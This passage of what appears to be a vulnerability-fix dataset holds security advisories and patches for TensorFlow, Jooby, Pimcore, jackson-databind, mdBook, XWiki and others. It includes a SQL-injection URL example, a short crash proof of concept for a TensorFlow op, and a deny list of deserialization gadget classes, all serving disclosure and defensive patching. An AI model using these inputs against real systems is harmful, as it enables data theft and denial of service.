'f6fde895ef9c77d848061c0517f19d0ec2682f3a']","before_first_fix_commit":"{'cae81a7ae3ca6207396d5c893e8163f4acb34037'}","last_fix_commit":"f6fde895ef9c77d848061c0517f19d0ec2682f3a","chain_ord_pos":2.0,"commit_datetime":"05\/12\/2021, 01:32:03","message":"Validate that a and b are proper sparse tensors\n\nPiperOrigin-RevId: 373274848\nChange-Id: I3a665ac3a29dee9fb69bdf408a939330cb93ea75","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 6, 'total': 15}","files":"{'tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f6fde895ef9c77d848061c0517f19d0ec2682f3a\/tensorflow%2Fcore%2Fkernels%2Fsparse_sparse_binary_op_shared.cc', 'patch': '@@ -150,6 +150,7 @@ class SparseSparseBinaryOpShared : public OpKernel {\\n \\n     const int64 a_nnz = a_indices_t->dim_size(0);\\n     const int64 b_nnz = b_indices_t->dim_size(0);\\n+\\n     const auto a_values = a_values_t->vec<T>();\\n     const auto b_values = b_values_t->vec<T>();\\n \\n@@ -166,6 +167,14 @@ class SparseSparseBinaryOpShared : public OpKernel {\\n                     \"Input shapes should be a vector but received shapes \",\\n                     a_shape_t->shape().DebugString(), \" and \",\\n                     b_shape_t->shape().DebugString()));\\n+    const int num_dims = a_indices_t->dim_size(1);\\n+    OP_REQUIRES(\\n+        ctx, a_shape_t->NumElements() == num_dims,\\n+        errors::InvalidArgument(\"Second dimension of a_indices and length of \"\\n+                                \"a_shape must match, got \",\\n+                                num_dims, \" and \", a_shape_t->NumElements()));\\n+    OP_REQUIRES(ctx, num_dims > 0,\\n+                errors::InvalidArgument(\"Tensors must not be empty\"));\\n     OP_REQUIRES(ctx, a_shape_t->IsSameSize(*b_shape_t),\\n                 errors::InvalidArgument(\\n                     \"Operands do not have the same ranks; got shapes: \",\\n@@ -180,12 +189,6 @@ class SparseSparseBinaryOpShared : public OpKernel {\\n                                           \" for dimension \", i));\\n     }\\n \\n-    OP_REQUIRES(\\n-        ctx, a_indices_t->dim_size(1) == b_indices_t->dim_size(1),\\n-        errors::InvalidArgument(\\n-            \"Indices\\' dimensions do not match: got \", a_indices_t->dim_size(1),\\n-            \" and \", b_indices_t->dim_size(1), \" for the second dimension.\"));\\n-    const int num_dims = a_indices_t->dim_size(1);\\n     const auto a_indices_mat = a_indices_t->matrix<int64>();\\n     const auto b_indices_mat = b_indices_t->matrix<int64>();\\n     std::vector<T> a_augmented_values, b_augmented_values;'}}","message_norm":"validate that a and b are proper sparse tensors\n\npiperorigin-revid: 373274848\nchange-id: i3a665ac3a29dee9fb69bdf408a939330cb93ea75","language":"en","entities":"[('validate', 'ACTION', ''), ('373274848', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc'])","num_files":1.0},{"index":1936,"vuln_id":"GHSA-gv3v-92v6-m48j","cwe_id":"{'CWE-444'}","score":9.8,"chain":"{'https:\/\/github.com\/jooby-project\/jooby\/commit\/b66e3342cf95205324023cfdf2cb5811e8a6dcf4'}","dataset":"osv","summary":"Improper Neutralization of CRLF Sequences in HTTP Headers in Jooby ('HTTP Response Splitting) ### Impact\n\n - Cross Site Scripting\n - Cache Poisoning\n - Page Hijacking\n\n### Patches\n\nThis was fixed in version `2.2.1`.\n\n### Workarounds\n\nIf you are unable to update, ensure that user supplied data isn't able to flow to HTTP headers. If it does, pre-sanitize for CRLF characters.\n\n### References\n\n##### [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https:\/\/cwe.mitre.org\/data\/definitions\/113.html)\n\nI've been poking at libraries to see if they are vulnerable to HTTP Response Splitting and Jooby is my third case of finding this vulnerability.\n\n### Root Cause\n\nThis roots cause back to this line in the Jooby codebase:\n\nhttps:\/\/github.com\/jooby-project\/jooby\/blob\/93cfc80aa20c188f71a442ea7a1827da380e1c27\/modules\/jooby-netty\/src\/main\/java\/io\/jooby\/internal\/netty\/NettyContext.java#L102\n\nThe `DefaultHttpHeaders` takes a parameter `validate` which, when `true` (as it is for the no-arg constructor) validates that the header isn't being abused to do HTTP Response Splitting.\n\n### Reported By\n\nThis vulnerability was reported by @JLLeitschuh ([Twitter](https:\/\/twitter.com\/JLLeitschuh))\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jooby-project\/jooby](https:\/\/github.com\/jooby-project\/jooby\/issues)","published_date":"2020-04-03","chain_len":1,"project":"https:\/\/github.com\/jooby-project\/jooby","commit_href":"https:\/\/github.com\/jooby-project\/jooby\/commit\/b66e3342cf95205324023cfdf2cb5811e8a6dcf4","commit_sha":"b66e3342cf95205324023cfdf2cb5811e8a6dcf4","patch":"SINGLE","chain_ord":"['b66e3342cf95205324023cfdf2cb5811e8a6dcf4']","before_first_fix_commit":"{'d5708760bdd27f8f6e1dbbbabbda4379fd5ba926'}","last_fix_commit":"b66e3342cf95205324023cfdf2cb5811e8a6dcf4","chain_ord_pos":1.0,"commit_datetime":"10\/12\/2019, 13:30:52","message":"CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting fix #GHSA-gv3v-92v6-m48j","author":"Edgar Espina","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'modules\/jooby-netty\/src\/main\/java\/io\/jooby\/internal\/netty\/NettyContext.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jooby-project\/jooby\/raw\/b66e3342cf95205324023cfdf2cb5811e8a6dcf4\/modules%2Fjooby-netty%2Fsrc%2Fmain%2Fjava%2Fio%2Fjooby%2Finternal%2Fnetty%2FNettyContext.java', 'patch': '@@ -99,7 +99,7 @@\\n public class NettyContext implements DefaultContext, ChannelFutureListener {\\n \\n   private static final HttpHeaders NO_TRAILING = EmptyHttpHeaders.INSTANCE;\\n-  final DefaultHttpHeaders setHeaders = new DefaultHttpHeaders(false);\\n+  final DefaultHttpHeaders setHeaders = new DefaultHttpHeaders(true);\\n   private final int bufferSize;\\n   InterfaceHttpPostRequestDecoder decoder;\\n   private Router router;'}}","message_norm":"cwe-113: improper neutralization of crlf sequences in http headers ('http response splitting fix #ghsa-gv3v-92v6-m48j","language":"en","entities":"[('cwe-113', 'CWEID', ''), ('improper neutralization', 'SECWORD', ''), ('http response splitting', 'SECWORD', ''), ('ghsa-gv3v-92v6-m48j', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/jooby-netty\/src\/main\/java\/io\/jooby\/internal\/netty\/NettyContext.java'])","num_files":1.0},{"index":1941,"vuln_id":"GHSA-gvm4-h8j3-rjrq","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/77dd114513d7796e1e2b8aece214a380af26fbf4'}","dataset":"osv","summary":"CHECK-fail in `LoadAndRemapMatrix` ### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:\n    \n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/d94227d43aa125ad8b54115c03cece54f6a1977b\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.\n  \n```cc\nconst string& ckpt_path = ckpt_path_t->scalar<tstring>()();\n```\n\nHowever, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar<T>()()` to trigger and terminate the process.\n\n### Patches\nWe have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/77dd114513d7796e1e2b8aece214a380af26fbf4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/77dd114513d7796e1e2b8aece214a380af26fbf4","commit_sha":"77dd114513d7796e1e2b8aece214a380af26fbf4","patch":"SINGLE","chain_ord":"['77dd114513d7796e1e2b8aece214a380af26fbf4']","before_first_fix_commit":"{'faa76f39014ed3b5e2c158593b1335522e573c7f'}","last_fix_commit":"77dd114513d7796e1e2b8aece214a380af26fbf4","chain_ord_pos":1.0,"commit_datetime":"05\/04\/2021, 22:46:30","message":"Fix a check fail\n\nPiperOrigin-RevId: 372011072\nChange-Id: I1062cfaed0aa16884e9a16312483794d188db76f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/load_and_remap_matrix_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/77dd114513d7796e1e2b8aece214a380af26fbf4\/tensorflow%2Fcore%2Fkernels%2Fload_and_remap_matrix_op.cc', 'patch': '@@ -123,6 +123,11 @@ class LoadAndRemapMatrixOp : public OpKernel {\\n     \/\/ Processes the checkpoint source and the provided Tensor name.\\n     const Tensor* ckpt_path_t;\\n     OP_REQUIRES_OK(context, context->input(\"ckpt_path\", &ckpt_path_t));\\n+    OP_REQUIRES(\\n+        context, ckpt_path_t->NumElements() == 1,\\n+        errors::InvalidArgument(\"The `ckpt_path` tensor must have exactly one \"\\n+                                \"element, got tensor of shape \",\\n+                                ckpt_path_t->shape().DebugString()));\\n     const string& ckpt_path = ckpt_path_t->scalar<tstring>()();\\n     const Tensor* old_tensor_name_t;\\n     OP_REQUIRES_OK(context,'}}","message_norm":"fix a check fail\n\npiperorigin-revid: 372011072\nchange-id: i1062cfaed0aa16884e9a16312483794d188db76f","language":"en","entities":"[('fix', 'ACTION', ''), ('372011072', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/load_and_remap_matrix_op.cc'])","num_files":1.0},{"index":1942,"vuln_id":"GHSA-gvmf-wcx6-p974","cwe_id":"{'CWE-89'}","score":8.1,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/21559c6bf0e4e828d33ff7af6e88caecb5ac6549'}","dataset":"osv","summary":"Improper quoting of columns when using setOrderBy() or setGroupBy() on listing classes in Pimcore ### Impact\nPimcore offers developers listing classes to make querying data easier. This listing classes also allow to order or group the results based on one or more columns which should be quoted by default. \nThe actual issue is that quoting is not done properly in both cases, so there's the theoretical possibility to inject custom SQL if the developer is using this methods with input data and not doing proper input validation in advance and  so relies on the auto-quoting being done by the listing classes. \n\n##### Example: \n```php\n\/\/ request url: https:\/\/example.com\/foo?groupBy=o_id`; SELECT SLEEP(20);--\n\n$list = new DataObject\\Car\\Listing();\n$list->setOrderKey($request->get('orderBy'));\n$list->setGroupBy($request->get('groupBy'));\n$list->load();\n```\n\n### Patches\nUpgrade to >= 10.4.4 or apply the following patch manually: \nhttps:\/\/github.com\/pimcore\/pimcore\/commit\/21559c6bf0e4e828d33ff7af6e88caecb5ac6549.patch\n\n### Workarounds\nApply this patch manually: \nhttps:\/\/github.com\/pimcore\/pimcore\/commit\/21559c6bf0e4e828d33ff7af6e88caecb5ac6549.patch\n\n### References\nhttps:\/\/github.com\/pimcore\/pimcore\/pull\/12444","published_date":"2022-06-22","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/21559c6bf0e4e828d33ff7af6e88caecb5ac6549","commit_sha":"21559c6bf0e4e828d33ff7af6e88caecb5ac6549","patch":"SINGLE","chain_ord":"['21559c6bf0e4e828d33ff7af6e88caecb5ac6549']","before_first_fix_commit":"{'4c66ac7305ee0a5027ade88020d811761555148b'}","last_fix_commit":"21559c6bf0e4e828d33ff7af6e88caecb5ac6549","chain_ord_pos":1.0,"commit_datetime":"06\/20\/2022, 13:37:31","message":"[Security] SQL Injection in Data Hub GraphQL (#12444)\n\n* [Security] SQL Injection in Data Hub GraphQL (AbstractListing)\r\n\r\n* Update lib\/Model\/Listing\/AbstractListing.php\r\n\r\nCo-authored-by: Jacob Dreesen <j.dreesen@neusta.de>\r\n\r\n* Update lib\/Model\/Listing\/AbstractListing.php\r\n\r\nCo-authored-by: mcop1 <89011527+mcop1@users.noreply.github.com>\r\n\r\nCo-authored-by: Jacob Dreesen <j.dreesen@neusta.de>\r\nCo-authored-by: Bernhard Rusch <brusch@users.noreply.github.com>","author":"mcop1","comments":null,"stats":"{'additions': 16, 'deletions': 3, 'total': 19}","files":"{'lib\/Model\/Listing\/AbstractListing.php': {'additions': 16, 'deletions': 3, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/21559c6bf0e4e828d33ff7af6e88caecb5ac6549\/lib%2FModel%2FListing%2FAbstractListing.php', 'patch': '@@ -235,7 +235,7 @@ public function setOrderKey($orderKey, $quote = true)\\n                 if ($quote === false) {\\n                     $this->orderKey[] = $o;\\n                 } elseif ($this->isValidOrderKey($o)) {\\n-                    $this->orderKey[] = \\'`\\' . $o . \\'`\\';\\n+                    $this->orderKey[] = $this->quoteIdentifier($o);\\n                 }\\n             }\\n         }\\n@@ -411,8 +411,14 @@ public function setGroupBy($groupBy, $qoute = true)\\n         if ($groupBy) {\\n             $this->groupBy = $groupBy;\\n \\n-            if ($qoute && strpos($groupBy, \\'`\\') !== 0) {\\n-                $this->groupBy = \\'`\\' . $this->groupBy . \\'`\\';\\n+          if ($qoute) {\\n+                $quotedParts = [];\\n+                $parts = explode(\",\", trim($groupBy, \\'`\\'));\\n+                foreach($parts as $part) {\\n+                    $quotedParts[] = $this->quoteIdentifier(trim($part));\\n+                }\\n+\\n+                $this->groupBy = implode(\", \", $quotedParts);\\n             }\\n         }\\n \\n@@ -431,6 +437,13 @@ public function setValidOrders($validOrders)\\n         return $this;\\n     }\\n \\n+    public function quoteIdentifier(string $value): string\\n+    {\\n+        $db = Db::get();\\n+\\n+        return $db->quoteIdentifier($value);\\n+    }\\n+\\n     \/**\\n      * @param mixed $value\\n      * @param int|null $type'}}","message_norm":"[security] sql injection in data hub graphql (#12444)\n\n* [security] sql injection in data hub graphql (abstractlisting)\r\n\r\n* update lib\/model\/listing\/abstractlisting.php\r\n\r\nco-authored-by: jacob dreesen <j.dreesen@neusta.de>\r\n\r\n* update lib\/model\/listing\/abstractlisting.php\r\n\r\nco-authored-by: mcop1 <89011527+mcop1@users.noreply.github.com>\r\n\r\nco-authored-by: jacob dreesen <j.dreesen@neusta.de>\r\nco-authored-by: bernhard rusch <brusch@users.noreply.github.com>","language":"en","entities":"[('security', 'SECWORD', ''), ('sql injection', 'SECWORD', ''), ('#12444', 'ISSUE', ''), ('security', 'SECWORD', ''), ('sql injection', 'SECWORD', ''), ('j.dreesen@neusta.de', 'EMAIL', ''), ('j.dreesen@neusta.de', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Model\/Listing\/AbstractListing.php'])","num_files":1.0},{"index":1945,"vuln_id":"GHSA-gwp4-hfv6-p7hw","cwe_id":"{'CWE-502'}","score":7.5,"chain":"{'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/ad418eeb974e357f2797aef64aa0e3ffaaa6125b'}","dataset":"osv","summary":"Deserialization of untrusted data in FasterXML jackson-databind A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.","published_date":"2019-08-01","chain_len":1,"project":"https:\/\/github.com\/FasterXML\/jackson-databind","commit_href":"https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/ad418eeb974e357f2797aef64aa0e3ffaaa6125b","commit_sha":"ad418eeb974e357f2797aef64aa0e3ffaaa6125b","patch":"SINGLE","chain_ord":"['ad418eeb974e357f2797aef64aa0e3ffaaa6125b']","before_first_fix_commit":"{'322ae225cbcd07178a634e548d991b0aec6b47bf'}","last_fix_commit":"ad418eeb974e357f2797aef64aa0e3ffaaa6125b","chain_ord_pos":1.0,"commit_datetime":"07\/26\/2019, 04:58:11","message":"Backport #2387, #2389 fixes","author":"Tatu Saloranta","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'src\/main\/java\/com\/fasterxml\/jackson\/databind\/jsontype\/impl\/SubTypeValidator.java': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FasterXML\/jackson-databind\/raw\/ad418eeb974e357f2797aef64aa0e3ffaaa6125b\/src%2Fmain%2Fjava%2Fcom%2Ffasterxml%2Fjackson%2Fdatabind%2Fjsontype%2Fimpl%2FSubTypeValidator.java', 'patch': '@@ -89,6 +89,12 @@\\n         s.add(\"org.jdom.transform.XSLTransformer\");\\n         s.add(\"org.jdom2.transform.XSLTransformer\");\\n \\n+        \/\/ [databind#2387]: EHCache\\n+        s.add(\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\");\\n+\\n+        \/\/ [databind#2389]: logback\/jndi\\n+        s.add(\"ch.qos.logback.core.db.JNDIConnectionSource\");\\n+\\n         DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);\\n     }'}}","message_norm":"backport #2387, #2389 fixes","language":"en","entities":"[('#2387', 'ISSUE', ''), ('#2389', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/fasterxml\/jackson\/databind\/jsontype\/impl\/SubTypeValidator.java'])","num_files":1.0},{"index":1948,"vuln_id":"GHSA-gwrj-88fp-5m36","cwe_id":"{'CWE-94'}","score":8.5,"chain":"{'https:\/\/github.com\/whiteleaf7\/narou\/commit\/d07720e855293182563b749431dfbf6c2d1cdb42'}","dataset":"osv","summary":"Code injection in Narou Narou (aka Narou.rb) before 3.8.0 allows Ruby Code Injection via the title name or author name of a novel.","published_date":"2021-07-02","chain_len":1,"project":"https:\/\/github.com\/whiteleaf7\/narou","commit_href":"https:\/\/github.com\/whiteleaf7\/narou\/commit\/d07720e855293182563b749431dfbf6c2d1cdb42","commit_sha":"d07720e855293182563b749431dfbf6c2d1cdb42","patch":"SINGLE","chain_ord":"['d07720e855293182563b749431dfbf6c2d1cdb42']","before_first_fix_commit":"{'21f8d1b4cbfa42a80eae09d74bb5124fd6cde3f2'}","last_fix_commit":"d07720e855293182563b749431dfbf6c2d1cdb42","chain_ord_pos":1.0,"commit_datetime":"06\/27\/2021, 13:49:19","message":"prohibit embedding of novel information","author":"whiteleaf7","comments":null,"stats":"{'additions': 1, 'deletions': 8, 'total': 9}","files":"{'template\/converter.rb.erb': {'additions': 1, 'deletions': 8, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/whiteleaf7\/narou\/raw\/d07720e855293182563b749431dfbf6c2d1cdb42\/template%2Fconverter.rb.erb', 'patch': '@@ -1,14 +1,7 @@\\n # -*- coding: utf-8 -*-\\n <% Template.target_binary_version(1.0) -%>\\n \\n-=begin\\n-\u5bfe\u8c61\u5c0f\u8aac\u60c5\u5831\\n-\u30bf\u30a4\u30c8\u30eb: <%= @setting[\"title\"] %>\\n-\u4f5c\u8005: <%= @setting[\"author\"] %>\\n-URL: <%= @setting[\"toc_url\"] %>\\n-\\n-\u8a73\u7d30\u306b\u3064\u3044\u3066\u306f http:\/\/bit.ly\/1vTEH04 \u3092\u53c2\u7167\u3057\u3066\u4e0b\u3055\u3044\\n-=end\\n+# \u8a73\u7d30\u306b\u3064\u3044\u3066\u306f http:\/\/bit.ly\/1vTEH04 \u3092\u53c2\u7167\u3057\u3066\u4e0b\u3055\u3044\\n converter do\\n   # \u5404\u7a2e\u5909\u63db\u51e6\u7406\u304c\u3055\u308c\u308b\u300c\u524d\u300d\u306e\u751f\u30c7\u30fc\u30bf\u306b\u5bfe\u3057\u3066\u306e\u5909\u63db\u51e6\u7406\u3092\u8a18\u8ff0\\n   def before(io, text_type)'}}","message_norm":"prohibit embedding of novel information","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['template\/converter.rb.erb'])","num_files":1.0},{"index":1949,"vuln_id":"GHSA-gx5w-rrhp-f436","cwe_id":"{'CWE-79'}","score":8.2,"chain":"{'https:\/\/github.com\/rust-lang\/mdBook\/commit\/32abeef088e98327ca0dfccdad92e84afa9d2e9b'}","dataset":"osv","summary":"XSS in mdBook > This is a cross-post of [the official security advisory][ml]. The official post contains a signed version with our PGP key, as well.\n\n[ml]: https:\/\/groups.google.com\/g\/rustlang-security-announcements\/c\/3-sO6of29O0\n\nThe Rust Security Response Working Group was recently notified of a security issue affecting the search feature of mdBook, which could allow an attacker to execute arbitrary JavaScript code on the page.\n\nThe CVE for this vulnerability is [CVE-2020-26297](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2020-26297).\n\n## Overview\n\nThe search feature of mdBook (introduced in version 0.1.4) was affected by a cross site scripting vulnerability that allowed an attacker to execute arbitrary JavaScript code on an user's browser by tricking the user into typing a malicious search query, or tricking the user into clicking a link to the search page with the malicious search query prefilled.\n\nmdBook 0.4.5 fixes the vulnerability by properly escaping the search query.\n\n## Mitigations\n\nOwners of websites built with mdBook have to upgrade to mdBook 0.4.5 or greater and rebuild their website contents with it. It's possible to install mdBook 0.4.5 on the local system with:\n\n```\ncargo install mdbook --version 0.4.5 --force\n```\n\n## Acknowledgements\n\nThanks to Kamil Vavra for responsibly disclosing the vulnerability to us according to [our security policy](https:\/\/www.rust-lang.org\/policies\/security).\n\n## Timeline of events\n\nAll times are listed in UTC.\n\n- 2020-12-30 20:14 - The issue is reported to the Rust Security Response WG\n- 2020-12-30 20:32 - The issue is acknowledged and the investigation began\n- 2020-12-30 21:21 - Found the cause of the vulnerability and prepared the patch\n- 2021-01-04 15:00 - Patched version released and vulnerability disclosed","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rust-lang\/mdBook","commit_href":"https:\/\/github.com\/rust-lang\/mdBook\/commit\/32abeef088e98327ca0dfccdad92e84afa9d2e9b","commit_sha":"32abeef088e98327ca0dfccdad92e84afa9d2e9b","patch":"SINGLE","chain_ord":"['32abeef088e98327ca0dfccdad92e84afa9d2e9b']","before_first_fix_commit":"{'5de9b6841ed03c8149eeec3c8a5fcd40b5d4dbe0'}","last_fix_commit":"32abeef088e98327ca0dfccdad92e84afa9d2e9b","chain_ord_pos":1.0,"commit_datetime":"12\/30\/2020, 21:13:15","message":"fix xss in the search page\n\nThanks to Kamil Vavra for responsibly disclosing the vulnerability\naccording to Rust's Security Policy.","author":"Pietro Albini","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'src\/theme\/searcher\/searcher.js': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rust-lang\/mdBook\/raw\/32abeef088e98327ca0dfccdad92e84afa9d2e9b\/src%2Ftheme%2Fsearcher%2Fsearcher.js', 'patch': '@@ -145,6 +145,11 @@ window.search = window.search || {};\\n             url.push(\"\");\\n         }\\n \\n+        \/\/ encodeURIComponent escapes all chars that could allow an XSS except\\n+        \/\/ for \\'. Due to that we also manually replace \\' with its url-encoded\\n+        \/\/ representation (%27).\\n+        var searchterms = encodeURIComponent(searchterms.join(\" \")).replace(\/\\\\\\'\/g, \"%27\");\\n+\\n         return \\'<a href=\"\\' + path_to_root + url[0] + \\'?\\' + URL_MARK_PARAM + \\'=\\' + searchterms + \\'#\\' + url[1]\\n             + \\'\" aria-details=\"teaser_\\' + teaser_count + \\'\">\\' + result.doc.breadcrumbs + \\'<\/a>\\'\\n             + \\'<span class=\"teaser\" id=\"teaser_\\' + teaser_count + \\'\" aria-label=\"Search Result Teaser\">\\''}}","message_norm":"fix xss in the search page\n\nthanks to kamil vavra for responsibly disclosing the vulnerability\naccording to rust's security policy.","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/theme\/searcher\/searcher.js'])","num_files":1.0},{"index":1950,"vuln_id":"GHSA-gx6h-936c-vrrr","cwe_id":"{'CWE-79'}","score":7.4,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/053d957d53f2a543d158f3ab651e390d2728e0b9'}","dataset":"osv","summary":"Cross site scripting in registration template in xwiki-platform ### Impact\n\nWe found a possible XSS vector in the `registerinline.vm` template related to the `xredirect` hidden field. \nThis template is only used in the following conditions:\n  - the wiki must be open to registration for anyone\n  - the wiki must be closed to view for Guest users (more specifically the XWiki.Registration page must be forbidden in View for guest user)\n\nA way to obtain the second condition is when administrators checked the \"Prevent unregistered users from viewing pages, regardless of the page rights\" box in the administration rights.\n\n### Patches\n\nThe issue is patched in versions 12.10.11, 14.0-rc-1, 13.4.7, 13.10.3.\n\n### Workarounds\n\nThere are two main ways for protecting against this vulnerability, the easiest and the best one is by applying a patch in the `registerinline.vm` template, the patch consists in checking the value of the xredirect field to ensure it matches the following:\n```\n<input type=\"hidden\" name=\"xredirect\" value=\"$escapetool.xml($!request.xredirect)\" \/>\n```\n\nIf for some reason it's not possible to patch this file, another workaround is to ensure \"Prevent unregistered users from viewing pages, regardless of the page rights\" is not checked in the rights and apply a better right scheme using groups and rights on spaces. \n\n### References\n\nhttps:\/\/jira.xwiki.org\/browse\/XWIKI-19291\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https:\/\/jira.xwiki.org)\n* Email us at [security mailing list](mailto:security@xwiki.org)","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/053d957d53f2a543d158f3ab651e390d2728e0b9","commit_sha":"053d957d53f2a543d158f3ab651e390d2728e0b9","patch":"SINGLE","chain_ord":"['053d957d53f2a543d158f3ab651e390d2728e0b9']","before_first_fix_commit":"{'9ae3703c535e34d328fd60758f85a8ee358224ca'}","last_fix_commit":"053d957d53f2a543d158f3ab651e390d2728e0b9","chain_ord_pos":1.0,"commit_datetime":"01\/04\/2022, 10:09:57","message":"XWIKI-19291: redirect parameter is badly handled in register page\n\n  * Fix the typo","author":"Simon Urli","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'xwiki-platform-core\/xwiki-platform-web\/xwiki-platform-web-templates\/src\/main\/resources\/templates\/registerinline.vm': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/053d957d53f2a543d158f3ab651e390d2728e0b9\/xwiki-platform-core%2Fxwiki-platform-web%2Fxwiki-platform-web-templates%2Fsrc%2Fmain%2Fresources%2Ftemplates%2Fregisterinline.vm', 'patch': '@@ -45,7 +45,7 @@\\n       <div>\\n         <input type=\"hidden\" name=\"form_token\" value=\"$!services.csrf.token\" \/>\\n         <input type=\"hidden\" name=\"register\" value=\"1\" \/>\\n-        <input type=\"hidden\" name=\"xredirect\" value=\"$!request.xredirect\" \/>\\n+        <input type=\"hidden\" name=\"xredirect\" value=\"$escapetool.xml($!request.xredirect)\" \/>\\n         #set ($class = $xwiki.getClass(\\'XWiki.XWikiUsers\\'))\\n         #set ($obj = $class.newObject())\\n         #set ($serverobj = $class.newObject())'}}","message_norm":"xwiki-19291: redirect parameter is badly handled in register page\n\n  * fix the typo","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-web\/xwiki-platform-web-templates\/src\/main\/resources\/templates\/registerinline.vm'])","num_files":1.0},{"index":1952,"vuln_id":"GHSA-gx8x-g87m-h5q6","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/sparklemotion\/nekohtml\/commit\/a800fce3b079def130ed42a408ff1d09f89e773d'}","dataset":"osv","summary":"Denial of Service (DoS) in Nokogiri on JRuby ## Summary\n\nNokogiri `v1.13.4` updates the vendored `org.cyberneko.html` library to `1.9.22.noko2` which addresses [CVE-2022-24839](https:\/\/github.com\/sparklemotion\/nekohtml\/security\/advisories\/GHSA-9849-p7jc-9rmv). That CVE is rated 7.5 (High Severity).\n\nSee [GHSA-9849-p7jc-9rmv](https:\/\/github.com\/sparklemotion\/nekohtml\/security\/advisories\/GHSA-9849-p7jc-9rmv) for more 